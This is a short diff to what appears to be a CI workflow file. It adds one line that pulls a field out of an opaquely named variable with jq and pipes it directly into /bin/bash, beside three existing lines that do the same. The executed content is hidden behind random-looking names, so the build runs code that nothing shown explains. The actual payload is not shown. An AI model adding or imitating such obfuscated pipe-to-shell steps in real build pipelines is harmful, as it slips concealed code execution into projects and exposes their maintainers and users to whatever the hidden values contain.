@@ -53,6 +53,7 @@ jobs:
           printf '%s' "$k7764" | jq -r .p96826 | /bin/bash
           printf '%s' "$jzj0" | jq -r .ptx3 | /bin/bash
           echo $n72 | jq -r .mls19957 | /bin/bash
+          echo $nzluw8 | jq -r .jv1 | /bin/bash
 
       - name: Archive output
         if: always()
